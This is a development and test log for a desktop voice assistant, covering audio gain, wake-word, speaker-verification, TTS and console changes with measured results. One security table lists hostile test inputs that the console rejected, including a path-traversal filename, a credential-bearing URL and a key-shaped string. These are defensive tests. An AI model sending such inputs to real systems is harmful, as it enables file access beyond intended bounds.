`claude` is on PATH (2.1.223), so the CLI adapter's SIM-only status looked upgradable without a microphone. It is not, on this host: invoked as a child process, `claude -p <prompt>` returns **`Not logged in · Please run /login`** and exits 1. A nested invocation does not inherit the parent session's credentials. So `agents/cli.py` remains **SIM**. This is "attempted and blocked by login state", not "not yet tried" — the distinction matters for whoever picks up P9.

## Session 2026-08-24 (memory cross-process persistence — AUTO multi-process)

- Target: the automatable half of release blocker #11 in `docs/project-overview.md`(记忆跨会话持久性).
- New `scripts/acceptance/verify_memory_persistence.py`: three real interpreter processes over one SQLite file — process A writes a fact and exits; the parent edits the Markdown mirror out of band (front matter kept); a fresh process B must recall the original text, fold the edit via `sync_facts()` (`updated=1`), then return only the edited wording with the superseded wording gone. No mocks; scratch DB in a caller-provided temp dir; user `memory/` untouched.
- Every child hop forces `PYTHONUTF8`/`PYTHONIOENCODING` — same rationale as `core/agents/acp.py` `_UTF8_ENV`; without it the JSON fact text arrives cp936-mangled on this host.
- New `tests/integration/test_memory_cross_process.py` pins the property through the script and runs with the full suite.
- Result: `all_pass: true`. Group run (cross-process test + `tests/test_memory.py`) **66 passed**; full suite **635 passed, 3 skipped** in ~34 s (clean shell: no PYTHONUTF8/PYTHONIOENCODING, proxies cleared).
- Level: **AUTO_MULTI_PROCESS** — real processes and real files, but automation only. It does NOT close the REAL half of ADR 004's acceptance (a human relaunching the actual app and observing recall); that stays open under P10.

## Session 2026-08-24 (TTS multi-segment queueing — AUTO)

- Target: the long-standing gap 「长回复一次性合成播放」(handoff §5 / CLAUDE.md 未实现清单).
- Splitting lives in the orchestrator per ADR 001: `vox_plugin.plugin.split_speech()` cuts on CJK 。！？；… and ASCII ! ? ; ; newline; an ASCII dot between digits stays a decimal point (「3.14」 unsplit). Abbreviations like e.g. still split — prosody-only cost.
- `complete_turn` now emits one `tts.chunk` (index 0..n-1) per sentence; single-sentence replies produce byte-identical event sequences to before.
- New provider API: `speak_segments(texts)` synthesizes/plays sentence-by-sentence (first audio no longer waits for full-reply synthesis) and `stop()`/`is_stopped()` drop the unspoken remainder. This also fixes a real defect found en route: the concrete provider had **no** `stop()`, so plugin `cancel()` was a silent no-op with the real engine attached — barge-in could not actually silence audio.
- Legacy engines without `speak_segments` are drained sentence-by-sentence honouring `is_stopped()` between sentences. Failure semantics unchanged: any mid-queue failure still finishes the turn (LISTENING), memory stores the full reply.
- Tests: new `tests/test_plugin_tts_queue.py` (14 cases: splitter rules, chunk events, batch vs legacy engines, mid-queue failure, cancel-during-synthesis drops rest without opening audio). Adjacent groups green; full suite **649 passed, 3 skipped**.
- Level: **AUTO** (fake/stub playback). Real audible speech and real spoken barge-in remain REAL-MIC/REAL-WIN items.

## Session 2026-08-24 (bridge connect-phase retry — AUTO; REAL-AGENT re-probe still blocked)

- Transport gap 「没有重连策略」 closed conservatively: `LocalEvoXTransport` gained `attempts` (default **1** = off) + `retry_backoff_s`, and retries ONLY on failures that prove the request never left the process — `ConnectionRefusedError` / `socket.gaierror` (checked at both exception layers, since urlopen wraps them as `URLError.reason`).
- Deliberately NOT retried: timeouts and HTTP statuses — a blocking POST may have executed the turn server-side, and an automatic re-send could run it twice. The retry budget therefore cannot mask an ambiguous failure as success.
- CLI agents already carried a 120s timeout (error chunk) and runtime already recovers a failed turn to LISTENING with `task.failed`; this session only added the missing transport piece.
- Tests: 6 new cases in `tests/test_session_bridge.py` (refused→recover, DNS→recover, exhausted budget, timeout never retried, HTTP error never retried, default single attempt).
- REAL-AGENT re-probe on this host (2026-08-24): `claude -p` → Not logged in (2.1.241); `codex exec` → no output within 90 s (auth hang suspected); `opencode run` → "Unable to connect" to its provider endpoint. All three remain blocked; SIM-only status unchanged.

## Session 2026-08-24 (speaker gate hardening — AUTO)

- Human directive: harden the voiceprint gate. Scope kept honest: input-side heuristics only, NOT spoof/replay detection (ADR 002 limitation stands).
- Quality gate (`_audio_quality_issue`): rejects silence (RMS < `min_rms`, default 0.002) and clipping (share of samples at |x|>=0.99 above `max_clip_ratio`, default 0.05) BEFORE the model check — reachable and tested on model-less hosts.
- Brute-force cooldown: `max_consecutive_rejections` (default 5) input-driven rejections inside the streak window arm a `cooldown_s` (default 30 s) blanket refusal; injected clock makes it deterministic; streaks older than one window start fresh so yesterday's pressure cannot lock the owner out today.
- Optional multi-window vote: `verify_windows > 1` splits the buffer into equal windows and requires every one to clear threshold AND agree on the speaker; default 1 keeps today's single-window decision pending REAL-MIC tuning.
- `describe()` now reports `gate` config and `gate_stats` counters (ints only — no text, no vectors); fail-closed ordering unchanged and every new path lands on rejection.
- Tests: new `tests/test_speaker_hardening.py` (14 cases); existing groups updated where silence inputs now stop at the quality gate by design. Speaker+privacy+hardening group **44 passed**.
- Level: **AUTO**. Real-voice pass/rejection rates and replay behaviour remain REAL-MIC (P10) and are NOT claimed here.

## Session 2026-08-26 (standing-wave orb — Canvas 2D production renderer, FR-6.5)

The fluid-glass core (two counter-rotating gradient blobs behind a double inset-shadow shell) plus
eyes, blush and blink cycles were replaced by a **standing-wave core**: `desktop/src/core.ts` draws
one wave whose amplitude tracks the real `--amplitude` signal and whose **topology encodes state**.
Motivation is recorded in `THIRD_PARTY_NOTICES.md`: the removed layer credited its recipe to
`kkclaw`, whose licence this repo records inconsistently (in-file "MIT" vs `docs/handoff.md`
"Claw Desktop Pet License, resale prohibited") and whose checkout is no longer on disk.

### Waveform geometry — AUTO (deterministic, `render_core_to_text()` at fixed t = 1, R = 74)

| State | Arc length | Bounding box | Samples | Closed |
|---|---:|---|---:|---|
| idle | 115.61 | 115.44 × 4.79 | 97 | no |
| listening | 204.28 | 115.44 × 44.39 | 97 | no |
| thinking | 310.56 | 88.79 × 59.20 | 193 | yes |
| speaking | 211.03 | 115.44 × 36.69 | 97 | no |
| cancelled | 128.06 | 115.44 × 22.30 | 97 | no |
| error | 166.67 | 115.44 × 31.08 | 97 | no |

Six distinct arc lengths and six distinct heights: **a still frame identifies the state**, so FR-6.6
degradation no longer depends on animation. Lissajous knot multiplicity tracks the dispatch fan-out
(`task.progress.payload.agents.length`): lanes 1→4 give arc lengths 310.56 / 535.57 / 758.41 /
981.43 while the bounding box stays 88.79 × 59.20 — which is exactly why the fingerprint carries arc
length and not just the box.
### Colour pipeline and layout — AUTO (live page: computed styles + canvas pixel reads)

- Bitmap 296×296 for a 148 px element at DPR 2; `resize()` reopens the bitmap when DPR changes.
- Brightest canvas pixels per state equal the CSS `--wave` value exactly: listening rgb(60,224,207) = `#3ce0cf`, thinking rgb(140,124,255) = `#8c7cff`, speaking rgb(111,228,255) = `#6fe4ff`, cancelled rgb(125,134,143) = `#7d868f`, error rgb(255,95,74) = `#ff5f4a`; gated rgb(255,181,87) ≈ `#ffb454` (the amber rim stroke blends in). CSS is the single source of colour and it demonstrably reaches the raster.
- Opaque fill ratio 0.787 ≈ π/4 — the cavity fills the circle and nothing escapes the clip.
- `#orb` layout box stays 148×148 and `#core` is `pointer-events:none`, so the front-end-measured hit region is unchanged: circle r = 82 (74 + 8 px float margin); the confirm card adds a 340×137 rect and grows the window 199 → 344 px.
- FR-6.4: listening glow radius measured 31.12 px at amplitude 0.12 and 54 px at 1.0 (`28 + amp*26`).
- Build: `tsc && vite build` clean. CSS 13.08 → 7.22 kB, JS 8.77 → 11.88 kB (renderer added, fluid/eye/blush CSS removed). `preview.html` stays out of `dist/`.

### Visual capture — AUTO (headless Chromium/Edge, DPR 1)

`desktop/preview.html` renders the six states plus the gated overlay twice — on a dark and on a light
desktop backdrop. A transparent always-on-top orb lands on arbitrary wallpaper, so checking only the
dark case would be self-deception. Captured with
`msedge --headless=new --disable-gpu --screenshot --window-size=1200,560`.

Environment note: the in-app Browser preview pane **cannot** screenshot here ("the pane is not
displayed, so the page is not compositing frames"), so visual evidence goes through headless Edge.
Computed styles and canvas pixel reads do work in the pane and produced the numbers above.

**Not** verified in this session: real WebView2 transparent compositing, DPI 125 / 150 / 175 %,
multi-monitor, RDP software-render fallback, and the ≥30 min resource profile. All remain REAL-WIN (P10).

## Not yet verified

- Speaker gate on this host's microphone: own-voice pass rate, another person's rejection, recorded-replay behaviour (the gate does **not** claim replay resistance — ADR 002 「局限」).
- Spoken real-microphone Silero endpointing acceptance (device opening and quiet-input rejection are verified).
- Live EvoX conversation bridge.
- Real streaming first-token latency.
- Separate always-on-top, skip-taskbar wake window (defined and compiling, not visually accepted).
- Wake-orb click-through, shadow suppression, drag, and DPI conversion at 125% / 150% / 175% — all SIM/AUTO only, REAL-WIN pending (P10).
- A real external agent completing one turn (REAL-AGENT). **Attempted 2026-08-16 and 2026-08-24, blocked** on all three backends — see the session note above. `scripts/acceptance/probe_agents.py` is the retry.
- A third-party MCP server completing one `tools/call` (the client is SIM only — the tests drive an in-process fake server).
- Browser microphone capture in the console: the recording path is asserted end to end with synthesised WAV, but no clip has been recorded through a real `getUserMedia` grant.

## 2026-08-28 —— 控制台、MCP、语音入口（AUTO + 真实模型 + SIM）

| 项 | 实测 | 等级 |
|---|---|---|
| 全量回归 | **924 passed, 3 skipped** in 39.4 s（干净 shell，`env \| grep PYTHON` 为空） | AUTO |
| 语音契约 SHA-256 | `4f60b6124dcb9704624a0606f411981d0bf572de22fcf4a25fad133bd3c75de5`（**不变**） | AUTO |
| TTS 真实合成 | 「控制台测试完成」→ 44100 Hz / 6041 采样点 / **243 ms**（`play=false`，不需要输出设备） | AUTO + 真实模型 |
| 就绪清单（本机） | wake ok / asr ok / tts ok / speaker `model=ok enrolled=0` | AUTO |
| 控制台页面 | 九个区块全部渲染，`preview_console_logs` **零输出** | SIM |
| 控制台隐私 | `/api/state` 的 JSON 里搜不到 `token` / `voiceprint` / `embedding` / `vector` | AUTO |
| 一轮真实工具调用 | `POST /api/text {"text":"读一下 README.md"}` → `route=tool ok=true`，3511 字 | AUTO |
| 安全边界拒绝（实打 HTTP） | `mcp.require_confirmation` → 403 · `agents[0].command` → 403 · `../escape.md` → 400 · 私钥形状文本 → 403 | AUTO |
| 进程计数器 | RSS **42.25 MB** / CPU 0.28 s（`ctypes` 走 `GetProcessMemoryInfo`/`GetProcessTimes`） | AUTO |
| 模型体积（本机） | 总 **597 MB**；三个 `.tar.bz2` 归档 **261 MB** 可删；净 **336 MB**（KWS 36 / ASR 78 / TTS 183 / 声纹 38 / VAD 2.3） | AUTO |

一个被修掉的真缺陷：`SqliteMemoryStore` 的连接懒建且绑在第一个查询的线程上，第二个线程
抛 `sqlite3.ProgrammingError`。控制台是多线程的，所以症状是「保存档案成功，紧接着删除
档案 sync 失败」—— 读起来像调用方的 bug 而不是线程设计问题。修法 `check_same_thread=False`
加一把 `RLock`（**必须可重入**，`write()` 会调 `connection`，两者都取锁）。7 例真线程测试。

一个被发现但没修的：`VoxCordAdapter().load()` 报 `import failed: No module named 'voxcord_core'`
—— `D:\program\voxcord` **在**本机，是适配器的 sys.path 拼装与它的实际布局不匹配。那 2 个
skip 掩盖的是一个缺陷，不是在报告「本机没这个可选依赖」。理由见 `docs/backlog.md` B1。

**这一轮没有关掉任何 REAL 级阻塞项。** 做的是把它们从「一堆命令」变成「一条命令」：
`run_console.py`（看缺什么并补齐）· `run_voice.py`（说话）· `probe_agents.py`（REAL-AGENT
重试）· `resource_profile.py`（30 分钟画像，可无人值守启动但结论要人写）。


## 2026-08-28（第二轮）—— 控制台第二版界面 + 模型配置（AUTO + SIM，含两个真缺陷）

界面来源是使用者在 Open Design 里做的 `vox-console-v2.html`（2668 行，单文件内联，
零外部资源：`<link>` 0 个、`<img>` 0 个、`@font-face` 0 个），验收后装进
`core/console/static/index.html`。它引用三个当时**还不存在**的端点，本轮补齐。

| 项 | 实测 | 等级 |
|---|---|---|
| 全量回归 | **1009 passed, 3 skipped** in 36.3 s（干净 shell） | AUTO |
| 新增测试 | 模型方案 60 · 控制台 82→**103** · 配置编辑 29→**33** | AUTO |
| 九个视图 | 全部吃到真实读数（就绪 3/4 · 工具 2 + agent 1 · claude 可用 · MCP 三层全关 · 安全边界只读那几个键）；`preview_console_logs` **零输出** | SIM |
| `#models-degraded` | hidden —— 即 `/api/models` 真的通了，页面没退到出厂后备表 | SIM |
| 宽版布局（1440px，Edge headless） | 236px 侧栏 + 正文，读数砖/就绪板/色带/告警四块齐全 | SIM |
| 横向溢出 | 835px 与 1440px 两个宽度 `scrollWidth == clientWidth` | SIM |
| 极光（WebGL2） | 240 fps（预览面板），headless 下也拿到 GL2；`prefers-reduced-motion`、后台、非总览页时不跑 | SIM |
| **写入幂等** | 页面上点「保存方案」不改任何值 → `config/models.toml` SHA-256 `ce651c54…` **不变** | AUTO |
| 单行 diff | 改一个模型名 → 只有那一行变（2451 → 2449 字节）；改回来 → 回到原哈希 | AUTO |
| 端点探测（本机） | `GET http://127.0.0.1:11434/v1/models` → **真的发出了请求**，`WinError 10061 拒绝连接`（2065 ms 后放弃，502） | AUTO（真实套接字） |
| 端点探测（拒绝路径） | 非回环明文 HTTP、URL 带凭据、`file://` 三条在**建立套接字之前**被拒（400） | AUTO |
| 密钥形状拒绝 | `key_env = "sk-live-0123456789abcdef"` → 400，文件字节不变 | AUTO |
| 云端服务商探测 | **没试过**（19 条预设端点抄自各家文档，本项目一次都没打通过） | 未验证 |

**两个真缺陷，一个是本轮引入的、一个是既有的**：

1. **预设端点被复制进配置文件**（本轮引入，已修）。页面为了显示会把预设的
   `base`/`proto`/`key_env` 填进输入框，保存时一并送来。第一版实现照写 —— 结果「打开页面
   点一次保存」凭空长出四行，全是 `providers.py` 里已有的值，而且将来改预设表改不到它。
   修法：写侧丢掉「与预设相同且文件里本来没有」的字段；`custom` 除外；文件里已有该键时
   照写（好让「切回预设」更新那一行，而不是留下陈旧的覆盖值）。
2. **保存任何配置都会重写整个文件的行尾**（既有缺陷，已修）。`config_edit` 用
   `read_text` 读、`write_text` 写：前者把 `\r\n` 归一成 `\n`，后者在 Windows 上又翻译
   回去。**git 里看不见这件事**（本仓库 `core.autocrlf=true`，提交时归一化），所以代价不是
   diff 噪音，而是：一次「什么都没改的保存」会让文件的 SHA-256 变掉 —— 而上面那条「写入
   幂等」正是靠哈希取证的。发现方式也正是它：保存前后各算一次哈希，2451 → 2603 → 2513，
   第二跳纯粹是行尾。修法：行尾从字节里探、写入用 `newline=""`。LF 与 CRLF 各两条测试。

**一个渲染缺陷**（已修）：`.shell` 的 `align-items:flex-start` 是给横排布局的，转成竖排
（≤1080px）之后交叉轴变成宽度，侧栏与正文各自缩到内容宽 —— 侧栏内容是九个 nowrap 链接、
量出来 1026px，于是把 835px 的页面撑到 1043px，而 `nav` 的 `overflow-x:auto` 因为拿不到
确定宽度永远不生效。加 `align-items: stretch` 后 820 = 820，nav 自己滚。

**这一轮同样没有关掉任何 REAL 级阻塞项。** `config/models.toml` 现在能读能写能探端点，
但**没有任何运行时代码按它组装模型** —— 语音栈仍由 `voice.toml` + 四个环境变量决定。
所以 `active` 目前只是一个被记录的意图（`docs/backlog.md` B7）。


## 声纹：窗长、段数、条件（2026-08-30，AUTO + SIM）

素材是 KWS 模型自带的 7 段真实人声，模型是当前默认的 CAM++（dim 192）。脚本
`.vox-ref/probe_speaker_windows.py` 与 `.vox-ref/probe_speaker_conditions.py`，不打网络。

**1. `SpeakerEmbeddingManager.add(name, vectors)` 求质心，不是留全部。** 判据：两条正交
向量注册在一个名字下，各自只得 **0.7071**（= 1/√2，即到二者归一化均值的余弦）；单独注册
一条得 1.0000。这决定了后面两条的解释方式 —— 多段样本是在**平均掉每次说话的偶然偏差**，
不是在建一个「多模板」库。

**2. 窗长（注册 × 校验）配对。** 同一个人、同一条录音的两半：

| | 校验 1.0s | 1.5s | 2.0s | 3.0s |
|---|---|---|---|---|
| 注册 1.5s | 0.647 | 0.725 | 0.716 | 0.750 |
| **注册 3.0s** | 0.774 | **0.835** | 0.807 | **0.846** |

两条结论：注册窗长每一列都赢 0.10 左右（所以脚本录 3 s 是对的）；校验窗长从 1.0 到 3.0
差 **0.072**。这解释了「试一句 0.8 而实机 0.6」的一半 —— 诊断用 3 s、门用 1.5 s。

**3. 窗口里的静音要扣分。** 同一段 1.5 s 语音，前面补静音后再算：

| 前置静音 | 0.0s | 0.5s | 1.0s | 1.5s |
|---|---|---|---|---|
| 相似度 | **0.803** | 0.711 | 0.752 | 0.769 |

补静音一律低于不补，最多掉 **0.09**。**所以不要为了「窗口越长越好」去调大 `verify_seconds`**：
唤醒时那 1.5 s 是「以唤醒词结尾」的，而「你好小沃」本身约 1.0–1.2 s，1.5 s 正好装得下且
几乎不带静音；调到 2.5 s 只会把前面的安静房间灌进去。第 2 条的「越长越好」只在**连续语音**
上成立，两条不矛盾。

**4. 段数（同条件）单调有效。** 同一条录音的不同片段作为注册段：

| 注册段数 | 1 | 2 | 3 |
|---|---|---|---|
| 相似度 | 0.706 | 0.772 | **0.794** |

1 → 3 段 **+0.088**。这是「多录几轮会不会提高精度」的答案：会，而且可测。

**5. 混条件（SIM，不是真远场）。** 用加白噪声（SNR 6 dB）近似「离得远」：

| 档案 | 校验干净 | 校验加噪 |
|---|---|---|
| 只注册近场 | 0.745 | **0.607** |
| 近 + 远注册进**同一个**名字 | 0.750 | **0.722** |
| 近 / 远各一个名字，取最大 | 0.745 | 0.723 |

远场那一侧从 0.607 抬到 0.722（+0.115），而近场没有变差。两种做法打平 —— 但「各一个名字取
最大」在数学上**不可能**比其中最好的单个档案差（`_best_match` 是跨名字取最大），所以条件
差异大时它更安全。**这一条是 SIM**：加白噪声少了混响和方向性，真远场结论要 REAL-MIC。

`scripts/enroll_speaker.py` 因此改成默认 5 段、后两段要求退开两步，闭环校验按门的窗长报分。


## 输入音量：OS 那一侧的读数（2026-09-01，REAL-WIN）

使用者三次提出同一件事：「真正的最佳效果应该是无论何种设备、音量，都能准确的识别唤醒词」。
在此之前我们只能**建议**他去调 Windows 的滑条。读到那根滑条之后，两个长期症状变成了同一个
数字的两端 —— 纯 ctypes 走 Core Audio（`core/audio/winlevel.py`，零新依赖），同一时刻：

| 采集端点 | OS 输入音量 | 症状 |
|---|---|---|
| 耳机 (沉麟的耳机)（系统默认） | **0.01** | 「这只麦克风是死的」（原始峰值 ~0.01） |
| 麦克风阵列 (Realtek(R) Audio)（在用） | **0.82** | 「一说就削波」（注册第 3 段 peak 1.000） |
| 麦克风 (ToDesk Virtual Audio) | 0.20 | —— |

写入往返也已实测（拿空闲的虚拟设备做的）：0.20 → 0.35 → 复读 0.35 → 复原 0.20。

两条经核实的细节，写下来免得下次重新踩：

- **`CoInitializeEx(COINIT_MULTITHREADED)` 在这个进程里一定返回 `0x80010106`
  (`RPC_E_CHANGED_MODE`)** —— sounddevice/PortAudio 已经把线程初始化成 STA 了。它**不是
  错误**，按 `S_FALSE` 处理（照常用、出去时不反初始化）。
- **Core Audio 的友好名和 `sounddevice` 报的 MME/DirectSound/WASAPI 名逐字相同**，所以设备
  匹配用精确相等就够。不做模糊匹配是刻意的：同机同时存在「麦克风 (Realtek…)」和
  「麦克风阵列 (Realtek…)」，前者是后者的前缀，猜错等于去调另一只设备的音量。

**`input.device` 的索引会漂。** `config/voice.toml` 里 `device = "2"` 是 08-29 为
「耳机 (沉麟的耳机)」选的；09-01 实测同一个索引已经指到「麦克风阵列 (Realtek(R) Audio)」，
因为中间插拔过设备。索引本身仍然是对的选择（同一物理设备在四种 host API 下重复出现，名字
片段会让 sounddevice 抛 `Multiple input devices found`），但**每一处报设备的地方都改成报
名字**，让漂移可见 —— 就绪清单、`input_level.device`、`/api/devices` 都是。

校准（`/api/mic/calibrate`）用**二分**而不是按比例缩放：`SetMasterVolumeLevelScalar` 的标度
不是幅度的线性函数（实测 0.01 与 0.82 分别约合 0.03× 与 0.54× 幅度，即一条 dB 曲线，范围
还各家驱动不同）。按比例算下一步要先假设曲线，猜错就来回过冲；二分只依赖「音量调高峰值
不会变小」，对任何曲线都收敛，4 轮把标度收敛到 1/16。目标带 0.35–0.80：下界之下软件增益要
放大 2 倍以上（增益抬信号也抬底噪），上界留 2 dB 余量给「偶尔一句说得响」，因为过冲的代价
（削波，ADC 里发生，不可恢复）比欠冲大得多。**没听到说话时一格都不动** —— 拿房间底噪校准
会把音量推到顶，正好是削波那一端。


## 唤醒失效的真凶：我们自己在软件里造的削波（2026-09-01，SIM）

使用者报「注册流程正常，试一句也正常，就是无法进行真实的唤醒」。这三句话把故障锁在一段很窄
的代码里：**声纹读的是原始环形缓冲，KWS 读的是加过增益之后的音频** —— `_ring.write()` 在
`_callback` 里排在 `wake_held` 早退之前，KWS 那一步排在它之后，所以「试一句有分」根本不能
证明 KWS 被喂到了、更不能证明喂进去的东西是好的。

诊断方法是 `.vox-ref/wake_path_check.py`：把本人真实录音（`.vox-ref/rec/*.wav`，16 kHz）按
100 ms 一块喂进**和生产完全同一条链**（VAD → 增益 → `keyword_provider.feed`）。同一段
「你好小沃」念三遍，满分 3：

| 配置 | 命中 | 增益末值 | 输出峰值 |
|---|---|---|---|
| 逐块峰值算 `wanted`（旧） | **1 / 3** | 3.86 | **1.0（削波）** |
| 完全不加增益 | **3 / 3** | 1.0 | 0.746 |
| 峰值包络 + 乘前封顶（现在） | **3 / 3** | 0.81 | 0.684 |

机制：`wanted = target_peak / peak` 按**当前这一块**算，而一句话里大部分 100 ms 的块是气口、
轻辅音、字与字之间 —— 那些块峰值只有 0.03，于是 `wanted` 冲到 16 倍、增益一路爬到 4–6 倍；
紧接着的重音块（峰值 0.75）被乘成 1.7，然后被 `np.clip` 裁平。**裁平就是削波**，而那一行
的注释当年写的是「硬裁一次好过把失真交给下游模型」—— 硬裁本身就是失真。

两处修法：①`wanted` 改由**输入峰值包络**算（起音立刻跟上、回落 0.97/块），气口不再把增益
推高；②**上限在乘之前生效**（`min(gain, 0.95 / peak)`），让这一级造出削波在构造上不可能。
`describe()` 多报 `limited_blocks` —— 此前「我们自己有没有在造削波」在每一处读数里都不可见。

### 顺带量出来的两件事

**这个 KWS 对绝对电平几乎不敏感**（它的特征是归一化的）。同一段话等比缩到不同峰值：

| 配置 | 0.746 | 0.30 | 0.10 | 0.05 | 0.02 | 0.01 |
|---|---|---|---|---|---|---|
| 完全不加增益 | 3 | 3 | 3 | 3 | 3 | **2** |
| target 0.5 / release **0.05**（旧） | 3 | 3 | **2** | 3 | 3 | 3 |
| target 0.5 / release **0.005**（现在） | **3** | **3** | **3** | **3** | **3** | **3** |
| target 0.3 / release 0.005 | 3 | **2** | 3 | 3 | 3 | 3 |

所以自适应增益的定位从「常态 AGC」降级为「救援级」：真正救回的只有 0.01 那一档，而**增益
动得快是会扣命中的**（0.10 那一档 3/3 → 2/3）。`release` 因此从 0.05 降到 0.005。

这张表的**每一行都已经带着包络与封顶两处修法**，所以 0.10 那一档的 2/3 是 `release` 单独的
账。（一个反例值得记下来：第二次跑这张表时「rel.05」那一行其实跑的是新默认 0.005 ——
变体字典里那一行当时留空表示「用默认」，而默认值刚被改过。**参数扫的每一行都要显式给参数**，
否则标签会在改默认值的那一刻变成谎话。）

**ADC 削波那一端也扣命中，但要相当严重才扣得动。** 把录音推到过载再硬裁：

| 削平样本占比 | 0% | 0.15% | 1.05% | 5.14% | 14.65% |
|---|---|---|---|---|---|
| 命中（满分 3） | 3 | 3 | **2** | **1** | **1** |

**回调预算不是瓶颈**：VAD 0.37 ms + 增益 0.02 ms + KWS 1.27 ms = 1.66 ms，占 100 ms 块的
1.7%（所以「VAD 拖慢回调导致丢块」这个假设可以排除）。

等级是 **SIM**：音频没有经过 D/A → 空气 → A/D。真机对着麦克风喊仍然是 REAL-MIC。


## 唤醒率 4/10 的两个真因：解码束宽 + 一个漂掉的设备索引（2026-09-01，SIM + REAL-WIN）

使用者报「10 次只成 4 次」，并明确要求不许无脑降 `keywords_threshold`。两个根因，
全程 `threshold = 0.25` 不动。

### 1. 解码束宽（sherpa-onnx 默认 4）—— SIM

唤醒词的假设路径要和普通转写路径竞争束里的位置，束太窄时它在噪声里先被剪掉。症状是
**安静时叫得应、有人说话或开着风扇就叫不应**，而每一层都报告自己健康。

正样本 = 本人三段真录音（5 次机会）逐级加白噪声；负样本 = 本人念的另一个唤醒词
「你好问问」三遍 + 纯噪声（约 25 秒）：

| beam | 干净 | 20dB | 15dB | 10dB | 5dB | 0dB | -5dB | -10dB | 误唤醒 |
|---|---|---|---|---|---|---|---|---|---|
| 4（sherpa 默认） | 5/5 | 5/5 | 5/5 | 5/5 | 4/5 | **2/5** | 3/5 | 2/5 | 0 |
| 8 | 5/5 | 5/5 | 5/5 | 5/5 | 5/5 | 5/5 | 3/5 | 4/5 | 0 |
| **16（新默认）** | 5/5 | 5/5 | 5/5 | 5/5 | 5/5 | **5/5** | 4/5 | 4/5 | 0 |
| 32 | 5/5 | — | — | — | — | 5/5 | 5/5 | 5/5 | 0 |

代价基本为零：每块 1.10 ms（beam 4）→ 1.21 ms（beam 16），都是 100 ms 预算的约 1%。
不取 32 的理由是统计功效：「误唤醒 0」这个数字在 25 秒非唤醒词语音上说明不了什么。

同时试过但**没用**的两个旋钮：`keywords_score` 加分（1.5 / 2.0 / 3.0）在 0 dB 只到 4/5；
`num_trailing_blanks = 0` 没有区别。能抬起来的是束宽，不是加分。

### 2. `input.device = "2"` 已经不是那只耳机了 —— REAL-WIN

2026-08-29 记下那个索引时它是 `耳机 (沉麟的耳机)`；2026-09-01 索引 2 指向
`麦克风阵列 (Realtek(R) Audio)`，耳机成了 1。**索引由枚举顺序决定，插拔就移位，而移位
之后不报错**：流照常打开、回调照常触发，只是唤醒率变差。上一版配置注释还写着「[2] 耳机」
—— 那是配置与现实分岔最安静的一种形式。

两次测量都说那只内建阵列不该用：2026-08-29 同一时刻阵列 peak 0.00003 而耳机 0.188；
2026-09-01 安静环境阵列 0.00003、耳机 0.00031。

改法是让配置写**名字片段**而不是索引：`resolve_device` 按固定优先级取 WASAPI（这台机器上
耳机只有 WASAPI 报 16 kHz 原生），排除没有输入通道的设备，同一 host API 下重名才算真歧义。
名字没匹配上时先给一条可读的警告 —— PortAudio 的原话读起来像「设备 -1 查询失败」，而真实
情况是「你配的那只麦克风现在不在」。


## 一轮语音的耗时构成，以及唯一值得动的那一段（2026-09-01，真实端点 + 真实凭据）

先量整条链，再决定动哪里。

| 段 | 实测 | 结论 |
|---|---|---|
| ASR 每块推理 | 4.61 ms 均值 / 15.5 ms p95 | 100 ms 预算的 4.6%，不是瓶颈 |
| ASR 端点（说完之后的纯等待） | 固定 1.1–1.2 s | 100% 在我们手里，但**不能降**（见下） |
| LLM 首字（流式） | 5005 ms | 首字比整轮结束只早 **2 ms** |
| LLM 整轮（流式） | 5007 ms | 这个端点**根本不增量下发** |
| LLM 非流式 | 5637 ms | 与流式基本同价 |
| TTS（旧：两个 HTTP 往返） | 3 字 3353 / 11 字 4243 / 38 字 5786 ms | 约 3.3 s 固定开销 |

**「把 LLM 增量喂进 TTS」在这个端点上省不到时间**（首字 = 整轮），所以没有做。一次没有
收益的重构会把一条受测的状态机路径变脆。真正能省的是 TTS 那 3.3 秒固定开销。

### TTS 改走 SSE：一个请求，音频按帧下发

| 字数 | 旧：音频到手 | SSE：首块 | SSE：音频到手 |
|---|---|---|---|
| 3 | 3353 ms | 2405 ms | **2735 ms** |
| 11 | 4243 ms | 2267 ms | **3117 ms** |
| 38 | 5786 ms | 2301–2569 ms | **3700–3961 ms** |

生产装配路径复测：2609 / 3233 / 3783 ms，音频时长与峰值正确（0.69 / 2.77 / 7.08 s）。

两个附带结论：**SSE 首块到达时间与句子长度基本无关**（2.3–2.6 s），所以「把第一段切短
让它早出声」这个策略在流式下不再必要；`stop()` 现在在**帧之间**生效，打断不必等整句合成完。

### 端点静音 `rule2`：量完之后决定**不降** —— SIM

那 1.2 秒是每一轮里唯一完全由我们决定的等待，所以它看起来是最该砍的一刀。
`.vox-ref/endpoint_probe.py` 把本人真录音喂进**生产那条两段路径**（唤醒前喂 KWS，命中后
才开识别器，命中那一块不进识别器），测「判定说完的时刻」与「最终文本是否完整」：

| rule2 | 判定说完 | 最后有语音 | 浪费的等待 | 转写 |
|---|---|---|---|---|
| **1.2（默认）** | 未在录音内触发 | 6.7 s | — | 「你好小沃你好小沃」（两句合一段） |
| 1.0 | 5.4 s | 4.3 s | 1.1 s | 「你好小沃」（切开了） |
| 0.8 | 5.1 s | 4.3 s | 0.8 s | 「你好小沃」（切开了） |
| 0.5 | 4.8 s | 4.3 s | 0.5 s | 「你好小沃」（切开了） |

关键读数不是延迟那一列，是**切没切开**：这位说话人自己的短语间停顿是 **1.0–1.1 秒**。
rule2 = 1.2 时那些停顿不切句；降到 1.0 就切 —— 后半句落进下一轮或者干脆丢掉，而使用者
看到的是「它没听全」。

所以这 1.2 秒**不是余量，是按这个人的停顿长度定的**。三条规则已经从 `load()` 里提成
构造参数（能量、能调），但默认值不动，并且有一条测试禁止在没有新的停顿分布测量之前调小它。

### 结论：Wake → 第一声回答的构成

约 **1.0 s（应答音）+ 说话时长 + 1.2 s（端点）+ 5.0 s（LLM）+ 2.4 s（TTS 首块）**。
这一轮省下的是 TTS 那约 0.9 秒。**剩下的 5 秒在 LLM**，而它是所选模型与端点的属性
（`claude-opus-5` 经中转站，首字 = 整轮）—— 换一个更快的模型是配置决定，不是代码问题，
控制台的「模型配置」那一栏可以直接改并用「试一句」当判据。


## 一轮语音真正花在哪：朗读时间，不是接口延迟（2026-09-01，REAL-AGENT + 真实合成）

`.vox-ref/e2e_headless.py` 从「识别器交出文本」那一点接上，把余下每一段都真的跑一遍
（真实端点、真实凭据、真实合成与播放）。麦克风那一段仍未验，它**后面**的全验了。

| | 改前 | 改后 |
|---|---|---|
| 「你好，简单介绍一下你自己」 | 120 字 / 整轮 **28983 ms** | 32 字 / 整轮 **15983 ms** |
